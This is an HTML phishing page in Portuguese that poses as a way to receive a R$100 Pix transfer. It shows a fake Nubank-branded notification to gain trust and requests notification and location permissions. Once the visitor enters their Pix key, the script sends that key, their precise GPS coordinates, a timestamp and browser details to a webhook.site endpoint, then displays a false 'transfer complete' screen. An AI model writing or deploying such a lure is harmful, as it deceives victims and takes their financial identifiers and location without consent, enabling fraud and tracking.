<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>receber puxPix</title>

<style>
body{
  margin:0;
  background:#f2f2f2;
  height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
  font-family:Arial, sans-serif;
}
.card{
  background:#fff;
  padding:35px;
  border-radius:18px;
  width:320px;
  text-align:center;
}
button{
  background:#820ad1;
  color:#fff;
  border:none;
  padding:15px;
  width:100%;
  font-size:18px;
  border-radius:12px;
  cursor:pointer;
}
input{
  width:100%;
  padding:12px;
  font-size:16px;
  margin:15px 0;
  border-radius:8px;
  border:1px solid #ccc;
}
small{ color:#777; font-size:12px; }
.alert{
  color:#b00020;
  font-size:13px;
  margin-top:10px;
}
</style>
</head>

<body>

<div class="card" id="tela1">
  <button onclick="pedirPermissoes()">Receber Pix</button>
  <div id="erro1" class="alert"></div>
</div>

<div class="card" id="tela2" style="display:none">
  <input id="chave" placeholder="Digite sua chave Pix">
  <button onclick="confirmar()">Receber Pix</button>
  <small>Simulação — R$100,00 sera transferido</small>
</div>

<div class="card" id="tela3" style="display:none">
  <h3>✅ transferência concluída</h3>
  <p>a transferência chega em ate 3 dias úteis.</p>
</div>

<script>
const WEBHOOK = "https://webhook.site/7b90f2d2-5b54-422c-9ab9-24a37ba6bab6";
let lastPos = null;
let locationOk = false;

function pedirPermissoes(){
  document.getElementById("erro1").innerText = "";

  // pedir notificação primeiro, no clique
  if ("Notification" in window) {
    Notification.requestPermission().then(permission => {
      if (permission !== "granted") {
        document.getElementById("erro1").innerText =
          "Por favor permita notificações para continuar.";
        return;
      }

      // notificação de simulação (genérica)
      new Notification("transferência recebida", {
        body: "você recebeu uma transferência de R$100,00 de emanuel filipe viera filho",
        icon: "https://logodownload.org/wp-content/uploads/2019/08/nubank-logo-2.png"
      });

      // agora pedir localização
      pedirLocalizacao();
    });
  } else {
    document.getElementById("erro1").innerText =
      "Seu navegador não suporta notificações.";
  }
}

function pedirLocalizacao(){
  if(!navigator.geolocation){
    document.getElementById("erro1").innerText =
      "Seu navegador não suporta localização.";
    return;
  }

  navigator.geolocation.getCurrentPosition(
    pos => {
      locationOk = true;
      lastPos = pos;
      document.getElementById("tela1").style.display = "none";
      document.getElementById("tela2").style.display = "block";
    },
    () => {
      document.getElementById("erro1").innerText =
        "Por favor permita a localização para continuar.";
    }
  );
}

function confirmar(){
  fetch(WEBHOOK, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      chave_pix: document.getElementById("chave").value,
      latitude: lastPos.coords.latitude,
      longitude: lastPos.coords.longitude,
      precisao: lastPos.coords.accuracy,
      data: new Date().toISOString(),
      navegador: navigator.userAgent
    })
  });

  document.getElementById("tela2").style.display="none";
  document.getElementById("tela3").style.display="block";
}
</script>

</body>
</html>

</body>
</html>
